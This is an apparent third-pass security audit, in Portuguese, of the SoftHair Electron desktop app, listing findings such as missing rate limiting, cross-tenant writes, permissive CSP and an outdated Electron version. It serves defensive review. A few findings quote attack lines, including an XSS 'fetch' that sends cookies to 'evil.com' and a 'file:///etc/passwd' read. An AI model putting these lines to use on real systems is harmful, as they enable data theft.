# Electron Audit Pass 3

Auditoria de verificação dos fixes do Pass 2 + ângulos nunca cobertos. Branch: `claude/brave-beaver-6c804d`.

Pass 2 entregou 22/24 fixes Pass 1 confirmados + 31 novos itens (todos fixados). Este Pass 3:
1. Confere se os fixes Pass 2 funcionam de verdade na prática (não só "estão no código").
2. Cobre áreas nunca auditadas: setup wizard frontend, brute-force, drag-and-drop, dependências, rate limiting, multi-tenant validation em routes, crash recovery profundo, refresh token flow.

---

## Verificação Pass 2

| Item | Fix esperado | Verificação | Status |
|---|---|---|---|
| P2-C1 secrets dual-path | módulo `lib/secrets.js` com write atomic + 0o600 | `resolveJwtSecret` centralizado, env → file → generate, `writeSecretAtomic` faz tmp+rename | ✅ |
| P2-C2 race startup | `requestSingleInstanceLock` + write atomic | gotLock sync antes do whenReady; atomic write | ✅ |
| P2-C3 fallback key | sem `\|\| 'fallback'`; throw | `getEncryptionKey` lança `NO_JWT_SECRET` se ausente | ✅ |
| P2-C4 circular require | `getEncryptionKey` lazy require | require inline dentro da fn — ok | ✅ |
| P2-C5 hardcoded localSalaoId | `getLocalSalaoId` lê do JWT/DB | implementado em syncService:207 | ✅ |
| P2-C6 TOFU fingerprint | `checkServerIdentity` captura+valida | implementado em buildAxiosConfig:352 | ✅ |
| P2-A1 isPackaged env | `process.env.ELECTRON_IS_PACKAGED = String(app.isPackaged)` | main.js:431 — set antes do BrowserWindow | ✅ |
| P2-A2 validateId aplicado | `router.param('id', validateId)` em todas as rotas | 7 routers todos chamam — verified com grep | ✅ |
| P2-A3 syncManager legacy | classe deprecated no-op + limpa localStorage | syncManager.js + serverApi.js neutralizados | ✅ |
| P2-A4 localStorage token | AuthContext ainda escreve `localStorage.setItem('token', token)` | aceito como roadmap; tokenStorage primário, localStorage fallback | ⚠️ aceito |
| P2-A5 DNS rebinding Host | middleware aceita só hostname `localhost`/`127.0.0.1`/`::1` | server.js:54-64 implementado | ✅ |
| P2-A6 password complexity | letras+dígito+não-comum | `isStrongPassword` + COMMON_PASSWORDS | ✅ |
| P2-A7 bootstrap-admin race | `withTransaction` + re-check dentro | auth.js:60-85 | ✅ |
| P2-A8 sync 401 desabilita | sync.enabled = false + clearInterval | syncService:441-447 | ✅ |
| P2-M1 .env vazamento | filter no extraResources | package.json:40-54 — exclui `.env`, `.env.*`, `*.log`, nodemon, jest | ✅ |
| P2-M2 asarUnpack nativo | `**/*.node` glob | package.json:59 | ✅ |
| P2-M3 backend prune | `backend:prune` antes do build | package.json:12, 17-20 — script `npm prune --production` | ✅ |
| P2-M4 executeJavaScript inline | substituído por IPC `navigate` | main.js:360-364 + preload.js:37-46 + ElectronMenuBridge | ✅ |
| P2-M5 login-cloud validation | optional chaining + try/catch | sync.js:51-69 ok | ✅ |
| P2-M6 userData path duplicado | aceito (não quebra installs existentes) | documentado | ⚠️ aceito |
| P2-M7 dist/index.html CSP | CSP igual em ambos | grep confirma string idêntica | ✅ |
| P2-M8 logs purge old | `.old` > 30 dias removidos | main.js:171-189 — `purgeOldLogs()` chamado no whenReady | ✅ |
| P2-M9 showErrorBox headless | wrap `safeShowError` | main.js:131-142 — checa CI/HEADLESS/isReady | ✅ |
| P2-M10 ISO timestamps | `strftime('%Y-%m-%dT%H:%M:%fZ', 'now')` | initDb.js:37-178 — todos os defaults atualizados | ✅ |
| P2-B1 32 bytes secret | lib/secrets.js usa SECRET_BYTES=32 | secrets.js:20 | ✅ |
| P2-B2 upsert atomic ON CONFLICT | `INSERT ... ON CONFLICT(id) DO UPDATE` | syncService.js:537-548 | ✅ |
| P2-B3 loadConfig sync | OK (< 1KB) | non-issue | ✅ |
| P2-B4 disconnect unlink | `fs.unlinkSync(CONFIG_FILE)` | syncService:316-327 | ✅ |
| P2-B5 main.js secret persist fail | `app.exit(1)` em packaged | main.js:78-89 | ✅ |
| P2-B6 readToken fontes duplas | tokenStorage primário, localStorage fallback | api.js:25-27 | ✅ |
| P2-B7 NSIS uninstall data | aceito | documentado | ⚠️ aceito |

**Total Pass 2: 28 ✅ · 3 ⚠️ aceitos**

---

## CRITICOS

### [P3-C1] Frontend SEM setup wizard — primeira instalação trava no login porque o admin nunca foi criado

**Arquivos:** `SoftHair/frontend/src/App.jsx` (routes), `SoftHair/frontend/src/pages/Login.jsx`, comparar com `backend/src/routes/auth.js:29-99`

**Descrição:** O backend tem `GET /api/auth/needs-setup` e `POST /api/auth/bootstrap-admin` (criados em E4/P2-A6/P2-A7), mas o **frontend nunca os usa**. Buscas:
```bash
$ grep -rn "needs-setup\|bootstrap-admin\|SetupWizard" frontend/src/
# (vazio)
```

`App.jsx` routes apenas `Login`, `Register` (que redireciona para `/login`), `ForgotPassword`, `ResetPassword`. O `Login.jsx` chama `authAPI.login(email, password)` direto e mostra `err.response?.data?.error || 'Erro ao fazer login'`.

**Cenário primeira instalação:**
1. Electron empacotado é instalado em PC novo.
2. Backend embarcado roda `initDb` que cria salão padrão MAS **não cria admin** (E4 fix: comentário linha 222 diz "use o setup wizard na UI para criar o primeiro admin").
3. Janela abre em `/login` (sem `user`, vai para `<PublicRoute><Login /></PublicRoute>`).
4. Usuário digita qualquer email/senha. Backend retorna 401 "Credenciais inválidas" (nenhum admin existe).
5. Sem nenhum hint, sem botão "primeiro acesso", sem chamada a `/needs-setup`. **App é unusable forever.**

**Exploração:** não é exploit de segurança per se, mas **bloqueia totalmente a instalação fresh**. Pior: usuário, ao tentar resolver, pode setar manualmente env vars de bootstrap (`BOOTSTRAP_ADMIN_EMAIL=... BOOTSTRAP_ADMIN_PASSWORD=...`) cuja `bootstrapPassword.length >= 8` é a única validação (initDb.js:213) — bypass completo do `isStrongPassword` que existe no `/bootstrap-admin` POST.

**Fix:** No `Login.jsx`, antes do form mostrar, chamar `GET /api/auth/needs-setup`. Se `data.needsSetup === true`, renderizar um sub-formulário inline ("Primeira utilização? Crie sua conta admin") que faz POST em `/api/auth/bootstrap-admin` com nome/email/senha. Depois redireciona para `/login` com mensagem de sucesso.

### [P3-C2] Login sem rate limiting — brute force trivial contra admin local + DNS rebinding amplifica

**Arquivos:** `SoftHair/backend/src/routes/auth.js:101-159`; `backend/package.json` (sem `express-rate-limit` instalado)

**Descrição:** Login não tem proteção alguma contra brute force:
- bcrypt cost 10 = ~100ms por tentativa em CPU moderna = 10 tentativas/s
- senha admin de 8 chars com letras+dígitos = ~3.5×10^14 combinações — improvável de cracking online, MAS:
  - top-1000 senhas comuns + 60 minutos sem rate limit = high probability de hit num install onde admin usou senha lazy (e.g. "Admin123" passou o `isStrongPassword`)
  - múltiplos backends embarcados rodando em LAN (P2-A5 mitiga via Host check, mas atacante na mesma máquina contorna via 127.0.0.1)
  - **DNS rebinding (P2-A5 mitigado para 127.0.0.1)**: ainda assim, qualquer malware local (key logger, infostealer) pode rodar 10 logins/s em loop

Combinado com [P3-C1] (sem wizard, primeiro admin é criado via env vars sem `isStrongPassword`), o cenário típico tem senha relativamente fraca.

`/api/auth/needs-setup` é PÚBLICO — atacante consegue saber se o app está em estado fresh sem auth.

**Fix:** Adicionar `express-rate-limit` no backend embarcado. Limitar `/api/auth/login` a 5 tentativas / 15 min por IP. Limitar `/api/auth/bootstrap-admin` e `/api/auth/needs-setup` a 3/min. Logar tentativas falhas em arquivo `audit.log`.

### [P3-C3] `withTransaction` SQLite quebra silenciosamente se houver `await` real dentro do callback — E30 não foi de fato consertado

**Arquivos:** `SoftHair/backend/src/config/database.js:168-189`; chamadores em `routes/auth.js:60`, `routes/vendas.js:74-103`

**Descrição:** O Pass 1 fixou parcialmente (E30) trocando para `db.transaction(() => { return fn(wrapped); })`, mas o `fn` continua sendo passado como `async function` por todos os callers:

```js
// vendas.js:74
const result = await withTransaction(async (client) => {
  // ...
  const insertVenda = await client.query(`INSERT ...`);  // client.query é SYNC em SQLite
  // ...
});
```

O detalhe sutil: `db.transaction(syncFn)` em better-sqlite3 chama `syncFn` sincronamente. Se `syncFn = () => fn(wrapped)` e `fn` é async, então `syncFn` retorna **a Promise sem esperar**. Internamente, better-sqlite3 vê que a fn retornou (a Promise é o "return value") e **faz o COMMIT imediatamente**, MUITO antes dos awaits dentro de `fn` terminarem (se houver async real).

Funciona hoje porque `client.query` é sync (`stmt.all`, `stmt.run`) e `await syncResult` no JS resolve imediatamente no mesmo microtask. **Mas** — se algum dia alguém adicionar `await axios.post(...)` ou `await fetch(...)` ou `await fs.promises.readFile(...)` dentro do callback (caso real do `bootstrap-admin` se precisar enviar email de boas-vindas, ou venda com integração de pagamento), a atomicidade quebra silenciosamente:

1. INSERT executa
2. `await axios.post(...)` cede o event loop
3. better-sqlite3 já fez COMMIT (porque `syncFn` retornou a Promise)
4. axios falha → throw
5. `throw` no async function rejeita a Promise — mas a transaction já foi commitada
6. ROLLBACK não acontece (não há try/catch dentro do `db.transaction`)

**Exploração:** dado o uso atual (sem awaits reais), não há exploit ativo. **Mas é uma bomba-relógio** — qualquer dev futuro adicionando uma chamada async dentro de `withTransaction` introduz inconsistência prata-pura. Vale documentar com comentário robusto OU detectar e lançar erro.

**Fix:** No SQLite branch, detectar se `fn(wrapped)` retornou Promise — se sim, lançar erro fail-fast informando que o callback deve ser síncrono. Ou converter `wrapped.query` para realmente lançar se chamado de dentro de async-context que ceda controle. Documentar com JSDoc bem visível.

### [P3-C4] Routes não validam que `cliente_id`, `profissional_id`, `servico_id`, `produto_id` pertencem ao mesmo `salao_id` — cross-tenant write em multi-tenant futuro

**Arquivos:** `routes/agendamentos.js:76-102`, `routes/atendimentos.js:57-82`, `routes/vendas.js:63-110`

**Descrição:** O backend tem multi-tenancy via `req.salaoId` extraído do JWT. Mas no POST/PUT de agendamentos, atendimentos, vendas, **os IDs de relacionamento são aceitos sem validar que pertencem ao salão**:

```js
// agendamentos.js:88-95
const result = await queryRun(
  `INSERT INTO agendamentos (salao_id, cliente_id, profissional_id, servico_id, ...) 
   VALUES (?, ?, ?, ?, ?)`,
  [req.salaoId, cliente_id, profissional_id || null, servico_id, ...]
);
```

Atacante logado com token de `salaoId=1` pode chamar:
```http
POST /api/agendamentos
{ "cliente_id": 42, "servico_id": 99, "data_hora": "..." }
```
onde `cliente_id=42` e `servico_id=99` pertencem a `salaoId=2`. SQLite faz FK lookup mas **não verifica que `cliente.salao_id == agendamento.salao_id`**.

Hoje, em desktop single-tenant (SQLite tem só salaoId=1), é low-impact. **Mas o backend embarcado é compartilhado com o cloud server (sync) — quando o sync rodar com dados de OUTRO salão (caso `getLocalSalaoId` retorne 2 — ver fix P2-C5), o cross-tenant fica vivo.** Além disso, o cloud SOFT-HAIR-SERVER (Postgres) atende múltiplos salões; se o adapter do backend embarcado for usado por engano em modo `DATABASE_TYPE=postgres`, vira hole real.

Combinado com [P3-C7]: o sync pull aceita `salao_id` validation mas usa `getLocalSalaoId()` que pode resolver para qualquer salão do JWT cloud. Se atacante consegue manipular o JWT (P3-C2 brute force), get cross-tenant write.

**Fix:** Em cada POST/PUT, fazer `SELECT salao_id FROM clientes WHERE id = ?` e validar igualdade com `req.salaoId`. Idealmente um helper `validateFKs({ cliente_id, profissional_id, servico_id }, salaoId)` que faz lookups em batch.

### [P3-C5] `vendas` POST permite estoque negativo (sem check) — `UPDATE produtos SET quantidade_estoque = quantidade_estoque - ?` sem validar

**Arquivos:** `routes/vendas.js:95-99`

**Descrição:**
```js
await client.query(
  `UPDATE produtos SET quantidade_estoque = quantidade_estoque - ? WHERE id = ?`,
  [item.quantidade, item.produto_id]
);
```

Sem `WHERE quantidade_estoque >= ?` nem `CHECK` constraint, `quantidade_estoque` vira NEGATIVO se a venda for maior que o estoque. Bug de negócio. Combinado com [P3-C4] (sem validação que `produto_id` é do mesmo salão), atacante drena estoque de OUTRO salão arbitrário.

Pior: a transação P3-C3 não é realmente atomic com awaits async — race entre dois POSTs no mesmo produto poderia gerar overselling: ambos lêem `quantidade_estoque=10`, ambos vendem 8, ambos commitam — final = -6.

**Fix:** Adicionar guard `WHERE quantidade_estoque >= ?` no UPDATE. Se `rowCount === 0`, lançar erro `'Estoque insuficiente'` e abortar a transação. Logar incident.

### [P3-C6] Bootstrap admin: `BOOTSTRAP_ADMIN_EMAIL` env bypass do `isStrongPassword` — senha fraca por env

**Arquivos:** `backend/src/config/initDb.js:210-218`

**Descrição:**
```js
const bootstrapEmail = process.env.BOOTSTRAP_ADMIN_EMAIL;
const bootstrapPassword = process.env.BOOTSTRAP_ADMIN_PASSWORD;
if (bootstrapEmail && bootstrapPassword && bootstrapPassword.length >= 8) {
  const senhaHash = bcrypt.hashSync(bootstrapPassword, 10);
  // INSERT admin com senha fraca aceita
}
```

Só valida `.length >= 8`. **Não chama `isStrongPassword`** (que está em `routes/auth.js`, fora do scope). Setando `BOOTSTRAP_ADMIN_PASSWORD=12345678` (em COMMON_PASSWORDS), passa.

Como a env é setada via terminal/launch script, o owner pode involuntariamente usar senha fraca achando que o sistema valida. Pior: scripts de deploy de tenants externos podem programar `BOOTSTRAP_ADMIN_PASSWORD=password1` em massa.

**Fix:** Em `initDb.js`, importar `isStrongPassword` de `routes/auth.js` (ou mover para `lib/passwords.js`) e validar antes de criar. Se falhar, NÃO criar admin e logar warning destacado.

### [P3-C7] `getLocalSalaoId` pega ID do JWT cloud sem verificar se existe localmente — possível data poisoning

**Arquivos:** `backend/src/services/syncService.js:207-235`

**Descrição:** A função extrai `salaoId` do JWT cloud:
```js
const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf-8'));
if (payload.salaoId) {
  this._localSalaoId = Number(payload.salaoId);
  return this._localSalaoId;
}
```

Não valida que `payload.salaoId` corresponde a um salão existente no SQLite local. Se o JWT diz `salaoId=5` e o SQLite só tem `salaoId=1`, o `_localSalaoId` vira 5 e o pull aplica mudanças com `salao_id=5`. Os INSERTs vão funcionar porque FK em SQLite tem CASCADE/SET NULL mas não bloqueia salao_id inexistente — well, na verdade `FOREIGN KEY REFERENCES saloes(id)` REJEITA inserir se `saloes(id=5)` não existe. **Mas o pull faz upsert; o INSERT vai falhar com FK violation**, e o catch genérico em `applyRemoteChanges` só logam o erro e continua.

Cenário:
1. Usuário troca de salão na cloud (JWT cloud agora tem `salaoId=2`)
2. Local DB ainda tem só `salaoId=1`
3. Sync pull resolve `_localSalaoId=2`, mas todo `INSERT INTO clientes (salao_id=2, ...)` falha FK
4. Logs enchem de "FOREIGN KEY constraint failed"; sync silenciosamente não traz dados; usuário só vê `lastSync` atualizando mas nada chega

**Fix:** Em `getLocalSalaoId`, depois de extrair do JWT, validar com `SELECT id FROM saloes WHERE id = ? LIMIT 1`. Se não existe localmente, criar registro de salão local (ou alertar usuário via lastError "salão cloud não corresponde a salão local").

---

## ALTOS

### [P3-A1] `/api/health` endpoint público sem auth — leak de info via DNS rebinding (mesmo com Host check)

**Arquivos:** `backend/src/routes/health.js:5-21`; `server.js:105`

**Descrição:** Health endpoint:
```js
router.get('/', async (req, res) => {
  // ...
  res.json({ success: true, status: 'healthy', database: dbType });
});
```

Não exige auth. Antes do `authMiddleware`. **Mas atrás do Host check** (server.js:54-64) que rejeita Host headers que não sejam `localhost`/`127.0.0.1`. Então DNS rebinding via `evil.com → 127.0.0.1` é bloqueado.

**Porém**, a Host check **falha quando o atacante usa `Host: 127.0.0.1`** (não DNS, IP direto). Site malicioso pode fazer `fetch('http://127.0.0.1:3001/api/health')` com `mode: 'no-cors'` — o navegador NÃO envia request porque é cross-origin sem CORS e... espera, `mode: no-cors` permite envio mas a resposta é opaca. Atacante mede timing/latência para detectar SoftHair instalado no PC e qual versão do dbType.

Adicionalmente, `health.js` expõe `database: dbType` na resposta. Mesmo opaca, o cache lookup pode permitir info leak via side-channels.

**Fix:** Health endpoint deve responder genericamente sem detalhes (`{ ok: 1 }`), e/ou exigir auth como o resto. Pelo menos remover `database: dbType`.

### [P3-A2] `dist/index.html` CSP mais permissiva que main process — `connect-src https:` aceita qualquer HTTPS

**Arquivos:** `SoftHair/frontend/dist/index.html`, `frontend/index.html`

**Descrição:** CSP atual:
```
connect-src 'self' http://127.0.0.1:* http://localhost:* wss: https:;
```

`https:` (sem host) permite XHR para qualquer site HTTPS arbitrário. Se algum XSS injetar `fetch('https://evil.com/exfil?cookie='+cookie)`, passa. Helmet no backend (server.js:38) tem `connectSrc: ["'self'", 'http://127.0.0.1:*', 'https://*.onrender.com']`, mais restrito — mas as duas CSPs convivem (meta tag E header HTTP). A regra é mais restritiva vence apenas para mesma fonte; mas headers HTTP do backend só cobrem responses do backend, e o renderer carrega via `file://` (sem header). Resultado: a CSP efetiva no Electron é só a meta tag.

Para sync com cloud, o renderer NÃO precisa falar com Render diretamente — toda comunicação é via backend embarcado em 127.0.0.1. Portanto `connect-src 'self' http://127.0.0.1:* http://localhost:*` é suficiente.

**Fix:** Remover `wss:` e `https:` do CSP. Limitar a `'self' http://127.0.0.1:* http://localhost:*`.

### [P3-A3] BrowserWindow sem `spellcheck: false` — palavras digitadas vão para Google Spell Check (telemetria)

**Arquivos:** `SoftHair/electron/main.js:280-289`

**Descrição:** `webPreferences` não inclui `spellcheck`. **Default no Electron é `spellcheck: true`** desde Electron 9, e o spellchecker (com `setSpellCheckerLanguages` não setado) usa hunspell local na maioria das versões recentes. MAS em alguns builds (especialmente macOS) o spellchecker ainda envia dados para serviços de tradução. Para um app que processa CPF, telefone, email, endereço, ativar spell check sem revisão é privacy concern.

**Fix:** `spellcheck: false` em webPreferences, OU `spellcheck: true` + `mainWindow.webContents.session.setSpellCheckerLanguages([])` para garantir engine local.

### [P3-A4] Sem `webRequest` filter — qualquer recurso pode ser baixado (CSP é defense, não prevent)

**Arquivos:** `SoftHair/electron/main.js`

**Descrição:** Electron permite carregar imagens, scripts (via CSP), etc. CSP é o controle, mas defense-in-depth seria usar `session.webRequest.onBeforeRequest` para bloquear tudo que não seja loopback ou file:// local.

**Fix:** Adicionar `session.defaultSession.webRequest.onBeforeRequest({ urls: ['*://*/*'] }, (details, callback) => { const ok = details.url.startsWith('file://') || details.url.startsWith('http://127.0.0.1') || details.url.startsWith('http://localhost'); callback({ cancel: !ok }); });`. Não bloqueia data: URIs (necessárias para imgs base64), só http externos.

### [P3-A5] Drag-and-drop de arquivo na janela carrega arquivo file:// arbitrário — bypass do `will-navigate`

**Arquivos:** `SoftHair/electron/main.js`

**Descrição:** Sem handler de `did-attach-webview` ou `dragover/drop` na janela, soltar um arquivo HTML/PDF na BrowserWindow causa o Electron a tentar carregá-lo. `will-navigate` em production-mode bloqueia (linha 337-341: rejeita qualquer URL que não comece com indexURL), MAS:
- HTML soltado tem `file:///home/user/Downloads/evil.html`
- `will-navigate` evento dispara com essa URL
- Filter rejeita
- did-fail-load tenta voltar para indexURL — OK em prod
- MAS: se `evil.html` faz `window.location = 'file:///etc/passwd'` antes do load completar, alguns Electrons race condition permitem leak

**Fix:** Bloquear drag-and-drop totalmente. `mainWindow.webContents.on('will-navigate', ...)` já bloqueia, mas pode-se ser explícito com `mainWindow.webContents.session.on('will-download', e => e.preventDefault())` + injetar JS na página que faz `document.addEventListener('drop', e => e.preventDefault())` e `dragover`.

### [P3-A6] Electron vulnerabilities (`npm audit` reporta 17 advisories incluindo high) — versão 28.3.3 desatualizada

**Arquivos:** `SoftHair/package.json:86`

**Descrição:**
```
electron  <=39.8.4
Severity: high
- ASAR Integrity Bypass via resource modification (GHSA-vmqv-hx8q-j7mg)
- AppleScript injection in app.moveToApplicationsFolder (GHSA-5rqw-r77c-jp79)
- Service worker can spoof executeJavaScript IPC replies (GHSA-xj5x-m3f3-5x3h)
- Incorrect origin passed to permission request handler (GHSA-r5p7-gp4j-qhrx)
- ... 13 more
```

Versão atual: `^28.3.3`. Última: 42.x. Upgrade para 42 é breaking. Pelo menos atualizar para 28.x latest (28.3.x ou 30.x onde aplicável).

**Fix:** Atualizar Electron para versão LTS atual (`^33` ou `^34` que ainda recebe patches), ou pelo menos para o último 28.x que tem alguns fixes. Documentar trade-off de breaking changes.

### [P3-A7] `connect-src http://127.0.0.1:*` permite qualquer porta — backend pode ser 20000-30000 random (E7 fix sugeriu) e ainda funciona, mas atacante local pode rodar service em outra porta

**Arquivos:** `frontend/index.html` CSP, `frontend/dist/index.html`

**Descrição:** O CSP atual permite `connect-src http://127.0.0.1:*` — qualquer porta. Útil para flexibilidade, mas se um malware local roda em `127.0.0.1:8080` mostrando uma página fake, o renderer pode XHR para ela. Combinado com XSS, malware pode usar o renderer como proxy para vazar dados via cross-origin para o malware local.

**Fix:** Limitar à porta específica: `connect-src 'self' http://127.0.0.1:3001 http://localhost:3001`. Se a porta for dinâmica (sugerido em E7), passar via preload+IPC.

### [P3-A8] `crashReporter` não configurado — Electron envia crash dumps para Google por default em algumas versões

**Arquivos:** `SoftHair/electron/main.js`

**Descrição:** `crashReporter.start({ uploadToServer: false })` não foi chamado. Default no Electron varia por versão; em algumas versões antigas, crashes nativos eram enviados via Crashpad para `crashpad.googlepad.com`. Os dumps podem conter trechos de heap (CPF, senhas) sem consent do usuário.

**Fix:** Logo após `app.whenReady()`:
```js
const { crashReporter } = require('electron');
crashReporter.start({ uploadToServer: false, productName: 'SoftHair' });
```
Isso desativa o upload e mantém crash dumps localmente em `app.getPath('crashDumps')`.

### [P3-A9] Setup wizard — quando implementado (P3-C1), o backend de bootstrap-admin não valida que email é único contra `usuarios` — UNIQUE constraint cobre, mas mensagem genérica

**Arquivos:** `backend/src/routes/auth.js:80-95`

**Descrição:** `bootstrap-admin` faz `INSERT INTO usuarios ... UNIQUE(email)`. Se email já existe (admin antes desativado), UNIQUE violation cai no catch:
```js
if (error && /UNIQUE|duplicate key/i.test(error.message)) {
  return res.status(409).json({ success: false, error: 'Email já em uso' });
}
```
Funciona, mas a UI atual sequer chama esse endpoint (P3-C1). Quando chamar, vai ver "Email já em uso" e o usuário não tem nem como recuperar.

**Fix:** Cobrir junto com P3-C1.

### [P3-A10] Atendimentos DELETE é hard delete — perda permanente sem audit log

**Arquivos:** `backend/src/routes/atendimentos.js:117-127`

**Descrição:**
```js
const result = await queryRun(
  `DELETE FROM atendimentos WHERE id = ? AND salao_id = ?`,
  [req.params.id, req.salaoId]
);
```

Hard delete. `clientes` e `produtos` fazem soft delete (`UPDATE ativo = 0`). Atendimentos perdidos não retornam — vai contra recover-from-disaster e contra auditoria/LGPD (registros deletados podem precisar ser provados em processo trabalhista, ex.: profissional alega que atendimento existiu).

**Fix:** Trocar `DELETE` por `UPDATE status = 'cancelado'` ou adicionar coluna `deletado_em` para soft delete. Pelo menos popular `sync_log` antes do DELETE para audit trail.

---

## MEDIOS

### [P3-M1] `Login.jsx` ainda link `/register` e texto "Cadastre-se" — UX inconsistente porque o Register apenas redireciona para `/login`

**Arquivos:** `frontend/src/pages/Login.jsx:96-101`; `frontend/src/pages/Register.jsx`

**Descrição:** Login mostra `<Link to="/register">Cadastre-se</Link>`. Clicar → `<Register />` que faz `navigate('/login')` no mount → volta para Login. UX loop confuso. Em um app desktop single-user, "Cadastre-se" não faz sentido (não há multi-user signup público — o setup wizard é separado).

**Fix:** Remover o link "Cadastre-se" e a página Register. Ou substituir por link "Primeira utilização?" que aponta para o setup wizard (P3-C1).

### [P3-M2] `ForgotPassword.jsx` é placeholder estático "Esta funcionalidade não está disponível" — mas Login linka pra ela

**Arquivos:** `frontend/src/pages/Login.jsx:82-84`; `frontend/src/pages/ForgotPassword.jsx`

**Descrição:** Cliente clica "Esqueceu a senha?" → tela diz "entre em contato com administrador". Em desktop app single-user onde O PRÓPRIO usuário é o admin, isso é absurdo. Não há recuperação automática (não tem servidor email local).

**Fix:** Esconder link ou prover comando manual (CLI tool? `npm run reset-password`) com docs. Pelo menos texto deve esclarecer: "Use o script de reset incluso no instalador" ou similar.

### [P3-M3] `sync-config.json` mantém `cloudUrl` em plaintext mesmo após disconnect (se unlink falhar)

**Arquivos:** `backend/src/services/syncService.js:316-327`

**Descrição:** `disconnect()` faz `fs.unlinkSync(CONFIG_FILE)`. Em catch, fallback escreve `'{}'`. Mas se ambos falharem (disco read-only, permission), o config persiste no estado anterior — com cloudUrl e token criptografado. Não é leak de credencial (token está encrypted) mas é leak de qual server cloud o user usa.

**Fix:** Em caso de erro, tentar `fs.truncateSync(CONFIG_FILE, 0)` como último recurso. Logar warn destacado.

### [P3-M4] `syncService.knownFingerprint` armazenado em plaintext no `sync-config.json` — fingerprint não é segredo mas atacante sabe que TOFU está ativado

**Arquivos:** `backend/src/services/syncService.js:263, 245`

**Descrição:** Fingerprint do cert (SHA-256) é gravado em plaintext. Não é segredo (vai público no TLS handshake), mas a sua presença no JSON sinaliza "TOFU ativo". Atacante que quer trocar o servidor cloud para o seu, sabe que precisa apresentar o mesmo fingerprint (impossível sem comprometer Render). OK como é, mas vale criptografar junto para reduzir signal.

**Fix:** Trivial — pode incluir fingerprint dentro do encrypted blob. Mas low priority — fingerprint é public.

### [P3-M5] `validateId` middleware rejeita IDs com leading zero (`'001'`) — uso de codigos com leading zero é raro mas pode quebrar imports legados

**Arquivos:** `backend/src/middleware/validateId.js:7-14`

**Descrição:**
```js
if (!Number.isInteger(parsed) || parsed <= 0 || String(parsed) !== String(id)) {
  return res.status(400).json({ success: false, error: 'ID inválido' });
}
```

`String(parsed) !== String(id)` rejeita `'001'` porque `String(1) === '1'`. Em geral OK (URLs canônicas), mas se algum import CSV ou backup tiver IDs como `'001'` viraram chaves estrangeiras strings, podem quebrar.

**Fix:** Aceitar. Documentar. Não é vulnerabilidade.

### [P3-M6] Logs de sync incluem `salao_id` em mensagens — vazamento mínimo se logs forem sincronizados via OneDrive

**Arquivos:** `backend/src/services/syncService.js:507-509`

**Descrição:**
```js
console.warn(
  `[SyncService] DROP ${table}#${sanitized.id} — salao_id=${sanitized.salao_id} != local=${localSalaoId}`
);
```

Tudo via `appendLog` no main.js cai em userData/logs. Se o user sincroniza Documents via OneDrive (Linux/Mac também), os logs podem replicar info de salaoId. Não é leak de dados sensíveis (CPF, senha), mas é metadata útil para reconnaissance.

**Fix:** Logar contagens (`{table}: 5 rejected`) em vez de IDs individuais.

### [P3-M7] `purgeOldLogs` chama `fs.readdirSync` no boot — bloqueia I/O 100-500ms em diretório com muitos arquivos

**Arquivos:** `electron/main.js:171-189, 434`

**Descrição:** No primeiro boot ou em PC com poucos logs, é trivial. Em PC com 5+ anos de instalação rotacionada, `purgeOldLogs` pode iterar centenas de arquivos antes de criar a window. Lentidão perceptível.

**Fix:** Mover para `setImmediate` ou `setTimeout(_, 5000)` após a janela aparecer.

### [P3-M8] `dialog.showErrorBox` em `safeShowError` ignora se `app.isReady()` for false — erros fatais no startup ficam só em console

**Arquivos:** `electron/main.js:133-142`

**Descrição:**
```js
if (process.env.CI || process.env.HEADLESS || !app.isReady()) {
  console.error(`[${title}] ${msg}`);
  return;
}
```

`!app.isReady()` impede dialog se chamada antes do whenReady. Mas `startBackend` é chamado dentro de whenReady, então `app.isReady()` deve ser true. Casos edge: `loadJwtSecret` chamado antes — depende de quem chama. Não é bug crítico, mas faz erros de boot ficarem invisíveis para usuário GUI.

**Fix:** Em vez de `!app.isReady()`, usar `try { dialog.showErrorBox(...) } catch (...)`. Mais robusto.

### [P3-M9] `getResourcePath` em main.js retorna paths não-normalizados — diferença entre dev/prod pode causar confusion em filesystem case-insensitive

**Arquivos:** `electron/main.js:62-70`

**Descrição:** Em macOS (case-insensitive default), `getResourcePath('Backend/src')` (capital B) vs `'backend/src'` resolve para mesmo arquivo mas `===` string compare em CSP/checks pode falhar. Não é bug ativo (todos chamadores usam minúsculas), mas vale `path.normalize`.

**Fix:** Adicionar `path.normalize` no return.

### [P3-M10] Tests no SOFT-HAIR-SERVER não cobrem nada do backend embarcado SoftHair — fix Pass 1/2/3 não tem test coverage

**Arquivos:** `SoftHair/backend/` não tem `tests/` ou `*.test.js`

**Descrição:** Toda a confiança nos fixes Pass 1-3 vem de syntax check (`node -c`) + revisão manual. Sem tests automatizados. Próxima refactor pode regridir.

**Fix:** Criar pelo menos suite mínima em `SoftHair/backend/tests/` para: sync allowlist (E4), tenant validation (E6), validateId, isStrongPassword, bootstrap-admin race, sync mutex.

---

## BAIXOS

### [P3-B1] `syncService._localSalaoId` cache permanente — se admin troca de salão na cloud sem `disconnect`, sync continua usando ID antigo

**Arquivos:** `backend/src/services/syncService.js:289-291`

**Descrição:** `_localSalaoId` cacheia para evitar query. É invalidado em `configure({ token })` (linha 289), mas se admin re-logar na cloud sem chamar configure (e.g. via UI de outro app), o cache continua. Edge case mas vale TTL.

**Fix:** TTL 1h no cache, ou invalidar em cada `syncNow` arranque.

### [P3-B2] Tests SOFT-HAIR-SERVER tem warning `localStorage is not available` — ignorável mas polui output

**Arquivos:** `SOFT-HAIR-SERVER/` (Node 22 ExperimentalWarning)

**Descrição:** `localStorage is not available because --localstorage-file was not provided`. Node 22 nativo. Não afeta tests mas confunde logs.

**Fix:** Adicionar `--no-warnings=ExperimentalWarning` ao test script.

### [P3-B3] `frontend/index.html` CSP `style-src 'self' 'unsafe-inline'` permite inline styles — Tailwind injeta inline styles mas `'unsafe-inline'` abre XSS via style attribute

**Arquivos:** `frontend/index.html`, `frontend/dist/index.html`

**Descrição:** Tailwind compila para classes, não inline. O `'unsafe-inline'` é para os `style={{...}}` em React (e.g. Sync.jsx usa `style={{ backgroundColor: 'var(--color-surface)' }}`). Sem `'unsafe-inline'`, todo `style={}` quebraria.

`'unsafe-inline'` em style é menos perigoso que em script (CSS expression injection foi removido modernos browsers), mas combinado com XSS em DOM (`dangerouslySetInnerHTML` se houver) permite exfil via background-image: url('https://evil').

**Fix:** `'unsafe-hashes'` + lista de hashes específicos, OU substituir inline styles por classes Tailwind. Custo alto. Aceitar com nota.

